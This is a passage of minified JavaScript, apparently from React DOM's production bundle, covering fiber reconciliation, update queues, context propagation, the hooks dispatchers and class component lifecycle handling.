          for (; !O.done; b++, O = y.next()) null !== (O = f(m, O.value, S)) && (p = i(O, p, b), null === P ? C = O : P.sibling = O, P = O);
          return re && gn(m, b), C;
        }
        for (k = r(m, k); !O.done; b++, O = y.next()) null !== (O = g(k, m, b, O.value, S)) && (e && null !== O.alternate && k.delete(null === O.key ? b : O.key), p = i(O, p, b), null === P ? C = O : P.sibling = O, P = O);
        return e && k.forEach(function (I) {
          return t(m, I);
        }), re && gn(m, b), C;
      }(m, p, y, S);
      si(m, y);
    }
    return "string" == typeof y && "" !== y || "number" == typeof y ? (y = "" + y, null !== p && 6 === p.tag ? (n(m, p.sibling), (p = o(p, y)).return = m, m = p) : (n(m, p), (p = xs(y, m.mode, S)).return = m, m = p), l(m)) : n(m, p);
  };
}
var Er = nm(!0),
  rm = nm(!1),
  el = fn(null),
  tl = null,
  sr = null,
  Au = null;
function Tu() {
  Au = sr = tl = null;
}
function Du(e) {
  var t = el.current;
  te(el), e._currentValue = t;
}
function wa(e, t, n) {
  for (; null !== e;) {
    var r = e.alternate;
    if ((e.childLanes & t) !== t ? (e.childLanes |= t, null !== r && (r.childLanes |= t)) : null !== r && (r.childLanes & t) !== t && (r.childLanes |= t), e === n) break;
    e = e.return;
  }
}
function mr(e, t) {
  tl = e, Au = sr = null, null !== (e = e.dependencies) && null !== e.firstContext && (e.lanes & t && (Re = !0), e.firstContext = null);
}
function Je(e) {
  var t = e._currentValue;
  if (Au !== e) if (e = {
    context: e,
    memoizedValue: t,
    next: null
  }, null === sr) {
    if (null === tl) throw Error(N(308));
    sr = e, tl.dependencies = {
      lanes: 0,
      firstContext: e
    };
  } else sr = sr.next = e;
  return t;
}
var En = null;
function Iu(e) {
  null === En ? En = [e] : En.push(e);
}
function om(e, t, n, r) {
  var o = t.interleaved;
  return null === o ? (n.next = n, Iu(t)) : (n.next = o.next, o.next = n), t.interleaved = n, Rt(e, r);
}
function Rt(e, t) {
  e.lanes |= t;
  var n = e.alternate;
  for (null !== n && (n.lanes |= t), n = e, e = e.return; null !== e;) e.childLanes |= t, null !== (n = e.alternate) && (n.childLanes |= t), n = e, e = e.return;
  return 3 === n.tag ? n.stateNode : null;
}
var Ht = !1;
function Mu(e) {
  e.updateQueue = {
    baseState: e.memoizedState,
    firstBaseUpdate: null,
    lastBaseUpdate: null,
    shared: {
      pending: null,
      interleaved: null,
      lanes: 0
    },
    effects: null
  };
}
function im(e, t) {
  e = e.updateQueue, t.updateQueue === e && (t.updateQueue = {
    baseState: e.baseState,
    firstBaseUpdate: e.firstBaseUpdate,
    lastBaseUpdate: e.lastBaseUpdate,
    shared: e.shared,
    effects: e.effects
  });
}
function bt(e, t) {
  return {
    eventTime: e,
    lane: t,
    tag: 0,
    payload: null,
    callback: null,
    next: null
  };
}
function tn(e, t, n) {
  var r = e.updateQueue;
  if (null === r) return null;
  if (r = r.shared, 2 & K) {
    var o = r.pending;
    return null === o ? t.next = t : (t.next = o.next, o.next = t), r.pending = t, Rt(e, n);
  }
  return null === (o = r.interleaved) ? (t.next = t, Iu(r)) : (t.next = o.next, o.next = t), r.interleaved = t, Rt(e, n);
}
function $i(e, t, n) {
  if (null !== (t = t.updateQueue) && (t = t.shared, 4194240 & n)) {
    var r = t.lanes;
    n |= r &= e.pendingLanes, t.lanes = n, Su(e, n);
  }
}
function wd(e, t) {
  var n = e.updateQueue,
    r = e.alternate;
  if (null !== r && n === (r = r.updateQueue)) {
    var o = null,
      i = null;
    if (null !== (n = n.firstBaseUpdate)) {
      do {
        var l = {
          eventTime: n.eventTime,
          lane: n.lane,
          tag: n.tag,
          payload: n.payload,
          callback: n.callback,
          next: null
        };
        null === i ? o = i = l : i = i.next = l, n = n.next;
      } while (null !== n);
      null === i ? o = i = t : i = i.next = t;
    } else o = i = t;
    return n = {
      baseState: r.baseState,
      firstBaseUpdate: o,
      lastBaseUpdate: i,
      shared: r.shared,
      effects: r.effects
    }, void (e.updateQueue = n);
  }
  null === (e = n.lastBaseUpdate) ? n.firstBaseUpdate = t : e.next = t, n.lastBaseUpdate = t;
}
function nl(e, t, n, r) {
  var o = e.updateQueue;
  Ht = !1;
  var i = o.firstBaseUpdate,
    l = o.lastBaseUpdate,
    s = o.shared.pending;
  if (null !== s) {
    o.shared.pending = null;
    var a = s,
      u = a.next;
    a.next = null, null === l ? i = u : l.next = u, l = a;
    var d = e.alternate;
    null !== d && (s = (d = d.updateQueue).lastBaseUpdate) !== l && (null === s ? d.firstBaseUpdate = u : s.next = u, d.lastBaseUpdate = a);
  }
  if (null !== i) {
    var f = o.baseState;
    for (l = 0, d = u = a = null, s = i;;) {
      var v = s.lane,
        g = s.eventTime;
      if ((r & v) === v) {
        null !== d && (d = d.next = {
          eventTime: g,
          lane: 0,
          tag: s.tag,
          payload: s.payload,
          callback: s.callback,
          next: null
        });
        e: {
          var x = e,
            h = s;
          switch (v = t, g = n, h.tag) {
            case 1:
              if ("function" == typeof (x = h.payload)) {
                f = x.call(g, f, v);
                break e;
              }
              f = x;
              break e;
            case 3:
              x.flags = -65537 & x.flags | 128;
            case 0:
              if (null == (v = "function" == typeof (x = h.payload) ? x.call(g, f, v) : x)) break e;
              f = le({}, f, v);
              break e;
            case 2:
              Ht = !0;
          }
        }
        null !== s.callback && 0 !== s.lane && (e.flags |= 64, null === (v = o.effects) ? o.effects = [s] : v.push(s));
      } else g = {
        eventTime: g,
        lane: v,
        tag: s.tag,
        payload: s.payload,
        callback: s.callback,
        next: null
      }, null === d ? (u = d = g, a = f) : d = d.next = g, l |= v;
      if (null === (s = s.next)) {
        if (null === (s = o.shared.pending)) break;
        s = (v = s).next, v.next = null, o.lastBaseUpdate = v, o.shared.pending = null;
      }
    }
    if (null === d && (a = f), o.baseState = a, o.firstBaseUpdate = u, o.lastBaseUpdate = d, null !== (t = o.shared.interleaved)) {
      o = t;
      do {
        l |= o.lane, o = o.next;
      } while (o !== t);
    } else null === i && (o.shared.lanes = 0);
    Rn |= l, e.lanes = l, e.memoizedState = f;
  }
}
function xd(e, t, n) {
  if (e = t.effects, t.effects = null, null !== e) for (t = 0; t < e.length; t++) {
    var r = e[t],
      o = r.callback;
    if (null !== o) {
      if (r.callback = null, r = n, "function" != typeof o) throw Error(N(191, o));
      o.call(r);
    }
  }
}
var Fo = {},
  wt = fn(Fo),
  Co = fn(Fo),
  ko = fn(Fo);
function Cn(e) {
  if (e === Fo) throw Error(N(174));
  return e;
}
function Lu(e, t) {
  switch (J(ko, t), J(Co, e), J(wt, Fo), e = t.nodeType) {
    case 9:
    case 11:
      t = (t = t.documentElement) ? t.namespaceURI : qs(null, "");
      break;
    default:
      t = qs(t = (e = 8 === e ? t.parentNode : t).namespaceURI || null, e = e.tagName);
  }
  te(wt), J(wt, t);
}
function Cr() {
  te(wt), te(Co), te(ko);
}
function lm(e) {
  Cn(ko.current);
  var t = Cn(wt.current),
    n = qs(t, e.type);
  t !== n && (J(Co, e), J(wt, n));
}
function ju(e) {
  Co.current === e && (te(wt), te(Co));
}
var oe = fn(0);
function rl(e) {
  for (var t = e; null !== t;) {
    if (13 === t.tag) {
      var n = t.memoizedState;
      if (null !== n && (null === (n = n.dehydrated) || "$?" === n.data || "$!" === n.data)) return t;
    } else if (19 === t.tag && void 0 !== t.memoizedProps.revealOrder) {
      if (128 & t.flags) return t;
    } else if (null !== t.child) {
      t.child.return = t, t = t.child;
      continue;
    }
    if (t === e) break;
    for (; null === t.sibling;) {
      if (null === t.return || t.return === e) return null;
      t = t.return;
    }
    t.sibling.return = t.return, t = t.sibling;
  }
  return null;
}
var ms = [];
function zu() {
  for (var e = 0; e < ms.length; e++) ms[e]._workInProgressVersionPrimary = null;
  ms.length = 0;
}
var Ri = Lt.ReactCurrentDispatcher,
  vs = Lt.ReactCurrentBatchConfig,
  $n = 0,
  ie = null,
  ce = null,
  pe = null,
  ol = !1,
  io = !1,
  Po = 0,
  T0 = 0;
function ye() {
  throw Error(N(321));
}
function Fu(e, t) {
  if (null === t) return !1;
  for (var n = 0; n < t.length && n < e.length; n++) if (!at(e[n], t[n])) return !1;
  return !0;
}
function Uu(e, t, n, r, o, i) {
  if ($n = i, ie = t, t.memoizedState = null, t.updateQueue = null, t.lanes = 0, Ri.current = null === e || null === e.memoizedState ? L0 : j0, e = n(r, o), io) {
    i = 0;
    do {
      if (io = !1, Po = 0, 25 <= i) throw Error(N(301));
      i += 1, pe = ce = null, t.updateQueue = null, Ri.current = z0, e = n(r, o);
    } while (io);
  }
  if (Ri.current = il, t = null !== ce && null !== ce.next, $n = 0, pe = ce = ie = null, ol = !1, t) throw Error(N(300));
  return e;
}
function Wu() {
  var e = 0 !== Po;
  return Po = 0, e;
}
function vt() {
  var e = {
    memoizedState: null,
    baseState: null,
    baseQueue: null,
    queue: null,
    next: null
  };
  return null === pe ? ie.memoizedState = pe = e : pe = pe.next = e, pe;
}
function qe() {
  if (null === ce) {
    var e = ie.alternate;
    e = null !== e ? e.memoizedState : null;
  } else e = ce.next;
  var t = null === pe ? ie.memoizedState : pe.next;
  if (null !== t) pe = t, ce = e;else {
    if (null === e) throw Error(N(310));
    e = {
      memoizedState: (ce = e).memoizedState,
      baseState: ce.baseState,
      baseQueue: ce.baseQueue,
      queue: ce.queue,
      next: null
    }, null === pe ? ie.memoizedState = pe = e : pe = pe.next = e;
  }
  return pe;
}
function _o(e, t) {
  return "function" == typeof t ? t(e) : t;
}
function hs(e) {
  var t = qe(),
    n = t.queue;
  if (null === n) throw Error(N(311));
  n.lastRenderedReducer = e;
  var r = ce,
    o = r.baseQueue,
    i = n.pending;
  if (null !== i) {
    if (null !== o) {
      var l = o.next;
      o.next = i.next, i.next = l;
    }
    r.baseQueue = o = i, n.pending = null;
  }
  if (null !== o) {
    i = o.next, r = r.baseState;
    var s = l = null,
      a = null,
      u = i;
    do {
      var d = u.lane;
      if (($n & d) === d) null !== a && (a = a.next = {
        lane: 0,
        action: u.action,
        hasEagerState: u.hasEagerState,
        eagerState: u.eagerState,
        next: null
      }), r = u.hasEagerState ? u.eagerState : e(r, u.action);else {
        var f = {
          lane: d,
          action: u.action,
          hasEagerState: u.hasEagerState,
          eagerState: u.eagerState,
          next: null
        };
        null === a ? (s = a = f, l = r) : a = a.next = f, ie.lanes |= d, Rn |= d;
      }
      u = u.next;
    } while (null !== u && u !== i);
    null === a ? l = r : a.next = s, at(r, t.memoizedState) || (Re = !0), t.memoizedState = r, t.baseState = l, t.baseQueue = a, n.lastRenderedState = r;
  }
  if (null !== (e = n.interleaved)) {
    o = e;
    do {
      i = o.lane, ie.lanes |= i, Rn |= i, o = o.next;
    } while (o !== e);
  } else null === o && (n.lanes = 0);
  return [t.memoizedState, n.dispatch];
}
function gs(e) {
  var t = qe(),
    n = t.queue;
  if (null === n) throw Error(N(311));
  n.lastRenderedReducer = e;
  var r = n.dispatch,
    o = n.pending,
    i = t.memoizedState;
  if (null !== o) {
    n.pending = null;
    var l = o = o.next;
    do {
      i = e(i, l.action), l = l.next;
    } while (l !== o);
    at(i, t.memoizedState) || (Re = !0), t.memoizedState = i, null === t.baseQueue && (t.baseState = i), n.lastRenderedState = i;
  }
  return [i, r];
}
function sm() {}
function am(e, t) {
  var n = ie,
    r = qe(),
    o = t(),
    i = !at(r.memoizedState, o);
  if (i && (r.memoizedState = o, Re = !0), r = r.queue, Bu(dm.bind(null, n, r, e), [e]), r.getSnapshot !== t || i || null !== pe && 1 & pe.memoizedState.tag) {
    if (n.flags |= 2048, bo(9, cm.bind(null, n, r, o, t), void 0, null), null === me) throw Error(N(349));
    30 & $n || um(n, t, o);
  }
  return o;
}
function um(e, t, n) {
  e.flags |= 16384, e = {
    getSnapshot: t,
    value: n
  }, null === (t = ie.updateQueue) ? (t = {
    lastEffect: null,
    stores: null
  }, ie.updateQueue = t, t.stores = [e]) : null === (n = t.stores) ? t.stores = [e] : n.push(e);
}
function cm(e, t, n, r) {
  t.value = n, t.getSnapshot = r, fm(t) && pm(e);
}
function dm(e, t, n) {
  return n(function () {
    fm(t) && pm(e);
  });
}
function fm(e) {
  var t = e.getSnapshot;
  e = e.value;
  try {
    var n = t();
    return !at(e, n);
  } catch {
    return !0;
  }
}
function pm(e) {
  var t = Rt(e, 1);
  null !== t && st(t, e, 1, -1);
}
function Sd(e) {
  var t = vt();
  return "function" == typeof e && (e = e()), t.memoizedState = t.baseState = e, e = {
    pending: null,
    interleaved: null,
    lanes: 0,
    dispatch: null,
    lastRenderedReducer: _o,
    lastRenderedState: e
  }, t.queue = e, e = e.dispatch = M0.bind(null, ie, e), [t.memoizedState, e];
}
function bo(e, t, n, r) {
  return e = {
    tag: e,
    create: t,
    destroy: n,
    deps: r,
    next: null
  }, null === (t = ie.updateQueue) ? (t = {
    lastEffect: null,
    stores: null
  }, ie.updateQueue = t, t.lastEffect = e.next = e) : null === (n = t.lastEffect) ? t.lastEffect = e.next = e : (r = n.next, n.next = e, e.next = r, t.lastEffect = e), e;
}
function mm() {
  return qe().memoizedState;
}
function Oi(e, t, n, r) {
  var o = vt();
  ie.flags |= e, o.memoizedState = bo(1 | t, n, void 0, void 0 === r ? null : r);
}
function $l(e, t, n, r) {
  var o = qe();
  r = void 0 === r ? null : r;
  var i = void 0;
  if (null !== ce) {
    var l = ce.memoizedState;
    if (i = l.destroy, null !== r && Fu(r, l.deps)) return void (o.memoizedState = bo(t, n, i, r));
  }
  ie.flags |= e, o.memoizedState = bo(1 | t, n, i, r);
}
function Ed(e, t) {
  return Oi(8390656, 8, e, t);
}
function Bu(e, t) {
  return $l(2048, 8, e, t);
}
function vm(e, t) {
  return $l(4, 2, e, t);
}
function hm(e, t) {
  return $l(4, 4, e, t);
}
function gm(e, t) {
  return "function" == typeof t ? (e = e(), t(e), function () {
    t(null);
  }) : null != t ? (e = e(), t.current = e, function () {
    t.current = null;
  }) : void 0;
}
function ym(e, t, n) {
  return n = null != n ? n.concat([e]) : null, $l(4, 4, gm.bind(null, t, e), n);
}
function Vu() {}
function wm(e, t) {
  var n = qe();
  t = void 0 === t ? null : t;
  var r = n.memoizedState;
  return null !== r && null !== t && Fu(t, r[1]) ? r[0] : (n.memoizedState = [e, t], e);
}
function xm(e, t) {
  var n = qe();
  t = void 0 === t ? null : t;
  var r = n.memoizedState;
  return null !== r && null !== t && Fu(t, r[1]) ? r[0] : (e = e(), n.memoizedState = [e, t], e);
}
function Sm(e, t, n) {
  return 21 & $n ? (at(n, t) || (n = _p(), ie.lanes |= n, Rn |= n, e.baseState = !0), t) : (e.baseState && (e.baseState = !1, Re = !0), e.memoizedState = n);
}
function D0(e, t) {
  var n = G;
  G = 0 !== n && 4 > n ? n : 4, e(!0);
  var r = vs.transition;
  vs.transition = {};
  try {
    e(!1), t();
  } finally {
    G = n, vs.transition = r;
  }
}
function Em() {
  return qe().memoizedState;
}
function I0(e, t, n) {
  var r = rn(e);
  if (n = {
    lane: r,
    action: n,
    hasEagerState: !1,
    eagerState: null,
    next: null
  }, Cm(e)) km(t, n);else if (null !== (n = om(e, t, n, r))) {
    st(n, e, r, Pe()), Pm(n, t, r);
  }
}
function M0(e, t, n) {
  var r = rn(e),
    o = {
      lane: r,
      action: n,
      hasEagerState: !1,
      eagerState: null,
      next: null
    };
  if (Cm(e)) km(t, o);else {
    var i = e.alternate;
    if (0 === e.lanes && (null === i || 0 === i.lanes) && null !== (i = t.lastRenderedReducer)) try {
      var l = t.lastRenderedState,
        s = i(l, n);
      if (o.hasEagerState = !0, o.eagerState = s, at(s, l)) {
        var a = t.interleaved;
        return null === a ? (o.next = o, Iu(t)) : (o.next = a.next, a.next = o), void (t.interleaved = o);
      }
    } catch {}
    null !== (n = om(e, t, o, r)) && (st(n, e, r, o = Pe()), Pm(n, t, r));
  }
}
function Cm(e) {
  var t = e.alternate;
  return e === ie || null !== t && t === ie;
}
function km(e, t) {
  io = ol = !0;
  var n = e.pending;
  null === n ? t.next = t : (t.next = n.next, n.next = t), e.pending = t;
}
function Pm(e, t, n) {
  if (4194240 & n) {
    var r = t.lanes;
    n |= r &= e.pendingLanes, t.lanes = n, Su(e, n);
  }
}
var il = {
    readContext: Je,
    useCallback: ye,
    useContext: ye,
    useEffect: ye,
    useImperativeHandle: ye,
    useInsertionEffect: ye,
    useLayoutEffect: ye,
    useMemo: ye,
    useReducer: ye,
    useRef: ye,
    useState: ye,
    useDebugValue: ye,
    useDeferredValue: ye,
    useTransition: ye,
    useMutableSource: ye,
    useSyncExternalStore: ye,
    useId: ye,
    unstable_isNewReconciler: !1
  },
  L0 = {
    readContext: Je,
    useCallback: function (e, t) {
      return vt().memoizedState = [e, void 0 === t ? null : t], e;
    },
    useContext: Je,
    useEffect: Ed,
    useImperativeHandle: function (e, t, n) {
      return n = null != n ? n.concat([e]) : null, Oi(4194308, 4, gm.bind(null, t, e), n);
    },
    useLayoutEffect: function (e, t) {
      return Oi(4194308, 4, e, t);
    },
    useInsertionEffect: function (e, t) {
      return Oi(4, 2, e, t);
    },
    useMemo: function (e, t) {
      var n = vt();
      return t = void 0 === t ? null : t, e = e(), n.memoizedState = [e, t], e;
    },
    useReducer: function (e, t, n) {
      var r = vt();
      return t = void 0 !== n ? n(t) : t, r.memoizedState = r.baseState = t, e = {
        pending: null,
        interleaved: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: e,
        lastRenderedState: t
      }, r.queue = e, e = e.dispatch = I0.bind(null, ie, e), [r.memoizedState, e];
    },
    useRef: function (e) {
      return e = {
        current: e
      }, vt().memoizedState = e;
    },
    useState: Sd,
    useDebugValue: Vu,
    useDeferredValue: function (e) {
      return vt().memoizedState = e;
    },
    useTransition: function () {
      var e = Sd(!1),
        t = e[0];
      return e = D0.bind(null, e[1]), vt().memoizedState = e, [t, e];
    },
    useMutableSource: function () {},
    useSyncExternalStore: function (e, t, n) {
      var r = ie,
        o = vt();
      if (re) {
        if (void 0 === n) throw Error(N(407));
        n = n();
      } else {
        if (n = t(), null === me) throw Error(N(349));
        30 & $n || um(r, t, n);
      }
      o.memoizedState = n;
      var i = {
        value: n,
        getSnapshot: t
      };
      return o.queue = i, Ed(dm.bind(null, r, i, e), [e]), r.flags |= 2048, bo(9, cm.bind(null, r, i, n, t), void 0, null), n;
    },
    useId: function () {
      var e = vt(),
        t = me.identifierPrefix;
      if (re) {
        var n = _t;
        t = ":" + t + "R" + (n = (Pt & ~(1 << 32 - lt(Pt) - 1)).toString(32) + n), 0 < (n = Po++) && (t += "H" + n.toString(32)), t += ":";
      } else t = ":" + t + "r" + (n = T0++).toString(32) + ":";
      return e.memoizedState = t;
    },
    unstable_isNewReconciler: !1
  },
  j0 = {
    readContext: Je,
    useCallback: wm,
    useContext: Je,
    useEffect: Bu,
    useImperativeHandle: ym,
    useInsertionEffect: vm,
    useLayoutEffect: hm,
    useMemo: xm,
    useReducer: hs,
    useRef: mm,
    useState: function () {
      return hs(_o);
    },
    useDebugValue: Vu,
    useDeferredValue: function (e) {
      return Sm(qe(), ce.memoizedState, e);
    },
    useTransition: function () {
      return [hs(_o)[0], qe().memoizedState];
    },
    useMutableSource: sm,
    useSyncExternalStore: am,
    useId: Em,
    unstable_isNewReconciler: !1
  },
  z0 = {
    readContext: Je,
    useCallback: wm,
    useContext: Je,
    useEffect: Bu,
    useImperativeHandle: ym,
    useInsertionEffect: vm,
    useLayoutEffect: hm,
    useMemo: xm,
    useReducer: gs,
    useRef: mm,
    useState: function () {
      return gs(_o);
    },
    useDebugValue: Vu,
    useDeferredValue: function (e) {
      var t = qe();
      return null === ce ? t.memoizedState = e : Sm(t, ce.memoizedState, e);
    },
    useTransition: function () {
      return [gs(_o)[0], qe().memoizedState];
    },
    useMutableSource: sm,
    useSyncExternalStore: am,
    useId: Em,
    unstable_isNewReconciler: !1
  };
function nt(e, t) {
  if (e && e.defaultProps) {
    for (var n in t = le({}, t), e = e.defaultProps) void 0 === t[n] && (t[n] = e[n]);
    return t;
  }
  return t;
}
function xa(e, t, n, r) {
  n = null == (n = n(r, t = e.memoizedState)) ? t : le({}, t, n), e.memoizedState = n, 0 === e.lanes && (e.updateQueue.baseState = n);
}
var Rl = {
  isMounted: function (e) {
    return !!(e = e._reactInternals) && Fn(e) === e;
  },
  enqueueSetState: function (e, t, n) {
    e = e._reactInternals;
    var r = Pe(),
      o = rn(e),
      i = bt(r, o);
    i.payload = t, null != n && (i.callback = n), null !== (t = tn(e, i, o)) && (st(t, e, o, r), $i(t, e, o));
  },
  enqueueReplaceState: function (e, t, n) {
    e = e._reactInternals;
    var r = Pe(),
      o = rn(e),
      i = bt(r, o);
    i.tag = 1, i.payload = t, null != n && (i.callback = n), null !== (t = tn(e, i, o)) && (st(t, e, o, r), $i(t, e, o));
  },
  enqueueForceUpdate: function (e, t) {
    e = e._reactInternals;
    var n = Pe(),
      r = rn(e),
      o = bt(n, r);
    o.tag = 2, null != t && (o.callback = t), null !== (t = tn(e, o, r)) && (st(t, e, r, n), $i(t, e, r));
  }
};
function Cd(e, t, n, r, o, i, l) {
  return "function" == typeof (e = e.stateNode).shouldComponentUpdate ? e.shouldComponentUpdate(r, i, l) : !t.prototype || !t.prototype.isPureReactComponent || !wo(n, r) || !wo(o, i);
}
function _m(e, t, n) {
  var r = !1,
    o = sn,
    i = t.contextType;
  return "object" == typeof i && null !== i ? i = Je(i) : (o = Ae(t) ? bn : Ee.current, i = (r = null != (r = t.contextTypes)) ? xr(e, o) : sn), t = new t(n, i), e.memoizedState = null !== t.state && void 0 !== t.state ? t.state : null, t.updater = Rl, e.stateNode = t, t._reactInternals = e, r && ((e = e.stateNode).__reactInternalMemoizedUnmaskedChildContext = o, e.__reactInternalMemoizedMaskedChildContext = i), t;
}
function kd(e, t, n, r) {
  e = t.state, "function" == typeof t.componentWillReceiveProps && t.componentWillReceiveProps(n, r), "function" == typeof t.UNSAFE_componentWillReceiveProps && t.UNSAFE_componentWillReceiveProps(n, r), t.state !== e && Rl.enqueueReplaceState(t, t.state, null);
}
function Sa(e, t, n, r) {
  var o = e.stateNode;
  o.props = n, o.state = e.memoizedState, o.refs = {}, Mu(e);
  var i = t.contextType;
  "object" == typeof i && null !== i ? o.context = Je(i) : (i = Ae(t) ? bn : Ee.current, o.context = xr(e, i)), o.state = e.memoizedState, "function" == typeof (i = t.getDerivedStateFromProps) && (xa(e, t, i, n), o.state = e.memoizedState), "function" == typeof t.getDerivedStateFromProps || "function" == typeof o.getSnapshotBeforeUpdate || "function" != typeof o.UNSAFE_componentWillMount && "function" != typeof o.componentWillMount || (t = o.state, "function" == typeof o.componentWillMount && o.componentWillMount(), "function" == typeof o.UNSAFE_componentWillMount && o.UNSAFE_componentWillMount(), t !== o.state && Rl.enqueueReplaceState(o, o.state, null), nl(e, n, o, r), o.state = e.memoizedState), "function" == typeof o.componentDidMount && (e.flags |= 4194308);
}
function kr(e, t) {
  try {
    var n = "",
      r = t;
    do {
      n += py(r), r = r.return;
    } while (r);
    var o = n;
  } catch (i) {
    o = "\nError generating stack: " + i.message + "\n" + i.stack;
  }
  return {
    value: e,
    source: t,
    stack: o,
    digest: null
  };
}
function ys(e, t, n) {
  return {
    value: e,
    source: null,
    stack: n !== null && n !== void 0 ? n : null,
    digest: t !== null && t !== void 0 ? t : null
  };
}
function Ea(e, t) {
  try {
    console.error(t.value);
  } catch (n) {
    setTimeout(function () {
      throw n;
    });
  }
}
var F0 = "function" == typeof WeakMap ? WeakMap : Map;
function bm(e, t, n) {
  (n = bt(-1, n)).tag = 3, n.payload = {
    element: null
  };
  var r = t.value;
  return n.callback = function () {
    sl || (sl = !0, Aa = r), Ea(e, t);
  }, n;
}
function Nm(e, t, n) {
  (n = bt(-1, n)).tag = 3;
  var r = e.type.getDerivedStateFromError;
  if ("function" == typeof r) {
    var o = t.value;
    n.payload = function () {
      return r(o);
    }, n.callback = function () {
      Ea(e, t);
    };
  }
  var i = e.stateNode;
  return null !== i && "function" == typeof i.componentDidCatch && (n.callback = function () {
    Ea(e, t), "function" != typeof r && (null === nn ? nn = new Set([this]) : nn.add(this));
    var l = t.stack;
    this.componentDidCatch(t.value, {
      componentStack: null !== l ? l : ""
    });
  }), n;
}
function Pd(e, t, n) {
  var r = e.pingCache;
  if (null === r) {
    r = e.pingCache = new F0();
    var o = new Set();
    r.set(t, o);
  } else void 0 === (o = r.get(t)) && (o = new Set(), r.set(t, o));
  o.has(n) || (o.add(n), e = e1.bind(null, e, t, n), t.then(e, e));
}
function _d(e) {
  do {
    var t;
    if ((t = 13 === e.tag) && (t = null === (t = e.memoizedState) || null !== t.dehydrated), t) return e;
    e = e.return;
  } while (null !== e);
  return null;
}
function bd(e, t, n, r, o) {
  return 1 & e.mode ? (e.flags |= 65536, e.lanes = o, e) : (e === t ? e.flags |= 65536 : (e.flags |= 128, n.flags |= 131072, n.flags &= -52805, 1 === n.tag && (null === n.alternate ? n.tag = 17 : ((t = bt(-1, 1)).tag = 2, tn(n, t, 1))), n.lanes |= 1), e);
}
var U0 = Lt.ReactCurrentOwner,
  Re = !1;
function ke(e, t, n, r) {
  t.child = null === e ? rm(t, null, n, r) : Er(t, e.child, n, r);
}
function Nd(e, t, n, r, o) {
  n = n.render;
  var i = t.ref;
  return mr(t, o), r = Uu(e, t, n, r, i, o), n = Wu(), null === e || Re ? (re && n && $u(t), t.flags |= 1, ke(e, t, r, o), t.child) : (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~o, Ot(e, t, o));
}
function $d(e, t, n, r, o) {
  if (null === e) {
    var i = n.type;
    return "function" != typeof i || Ju(i) || void 0 !== i.defaultProps || null !== n.compare || void 0 !== n.defaultProps ? ((e = Ii(n.type, null, r, t, t.mode, o)).ref = t.ref, e.return = t, t.child = e) : (t.tag = 15, t.type = i, $m(e, t, i, r, o));
  }
  if (i = e.child, !(e.lanes & o)) {
    var l = i.memoizedProps;
    if ((n = null !== (n = n.compare) ? n : wo)(l, r) && e.ref === t.ref) return Ot(e, t, o);
  }
  return t.flags |= 1, (e = on(i, r)).ref = t.ref, e.return = t, t.child = e;
}
function $m(e, t, n, r, o) {
  if (null !== e) {
    var i = e.memoizedProps;
    if (wo(i, r) && e.ref === t.ref) {
      if (Re = !1, t.pendingProps = r = i, !(e.lanes & o)) return t.lanes = e.lanes, Ot(e, t, o);
      131072 & e.flags && (Re = !0);
    }
  }
  return Ca(e, t, n, r, o);
}
function Rm(e, t, n) {
  var r = t.pendingProps,
    o = r.children,
    i = null !== e ? e.memoizedState : null;
  if ("hidden" === r.mode) {
    if (1 & t.mode) {
      if (!(1073741824 & n)) return e = null !== i ? i.baseLanes | n : n, t.lanes = t.childLanes = 1073741824, t.memoizedState = {
        baseLanes: e,
        cachePool: null,
        transitions: null
      }, t.updateQueue = null, J(ur, Me), Me |= e, null;
      t.memoizedState = {
        baseLanes: 0,
        cachePool: null,
        transitions: null
      }, r = null !== i ? i.baseLanes : n, J(ur, Me), Me |= r;
    } else t.memoizedState = {
      baseLanes: 0,
      cachePool: null,
      transitions: null
    }, J(ur, Me), Me |= n;
  } else null !== i ? (r = i.baseLanes | n, t.memoizedState = null) : r = n, J(ur, Me), Me |= r;
  return ke(e, t, o, n), t.child;
}
function Om(e, t) {
  var n = t.ref;
  (null === e && null !== n || null !== e && e.ref !== n) && (t.flags |= 512, t.flags |= 2097152);
}
function Ca(e, t, n, r, o) {
  var i = Ae(n) ? bn : Ee.current;
  return i = xr(t, i), mr(t, o), n = Uu(e, t, n, r, i, o), r = Wu(), null === e || Re ? (re && r && $u(t), t.flags |= 1, ke(e, t, n, o), t.child) : (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~o, Ot(e, t, o));
}
function Rd(e, t, n, r, o) {
  if (Ae(n)) {
    var i = !0;
    Zi(t);
  } else i = !1;
  if (mr(t, o), null === t.stateNode) Ai(e, t), _m(t, n, r), Sa(t, n, r, o), r = !0;else if (null === e) {
    var l = t.stateNode,
      s = t.memoizedProps;
    l.props = s;
    var a = l.context,
      u = n.contextType;
    "object" == typeof u && null !== u ? u = Je(u) : u = xr(t, u = Ae(n) ? bn : Ee.current);
    var d = n.getDerivedStateFromProps,
      f = "function" == typeof d || "function" == typeof l.getSnapshotBeforeUpdate;
    f || "function" != typeof l.UNSAFE_componentWillReceiveProps && "function" != typeof l.componentWillReceiveProps || (s !== r || a !== u) && kd(t, l, r, u), Ht = !1;
    var v = t.memoizedState;
    l.state = v, nl(t, r, l, o), a = t.memoizedState, s !== r || v !== a || Oe.current || Ht ? ("function" == typeof d && (xa(t, n, d, r), a = t.memoizedState), (s = Ht || Cd(t, n, s, r, v, a, u)) ? (f || "function" != typeof l.UNSAFE_componentWillMount && "function" != typeof l.componentWillMount || ("function" == typeof l.componentWillMount && l.componentWillMount(), "function" == typeof l.UNSAFE_componentWillMount && l.UNSAFE_componentWillMount()), "function" == typeof l.componentDidMount && (t.flags |= 4194308)) : ("function" == typeof l.componentDidMount && (t.flags |= 4194308), t.memoizedProps = r, t.memoizedState = a), l.props = r, l.state = a, l.context = u, r = s) : ("function" == typeof l.componentDidMount && (t.flags |= 4194308), r = !1);
  } else {
    l = t.stateNode, im(e, t), s = t.memoizedProps, u = t.type === t.elementType ? s : nt(t.type, s), l.props = u, f = t.pendingProps, v = l.context, "object" == typeof (a = n.contextType) && null !== a ? a = Je(a) : a = xr(t, a = Ae(n) ? bn : Ee.current);
    var g = n.getDerivedStateFromProps;
    (d = "function" == typeof g || "function" == typeof l.getSnapshotBeforeUpdate) || "function" != typeof l.UNSAFE_componentWillReceiveProps && "function" != typeof l.componentWillReceiveProps || (s !== f || v !== a) && kd(t, l, r, a), Ht = !1, v = t.memoizedState, l.state = v, nl(t, r, l, o);
    var x = t.memoizedState;
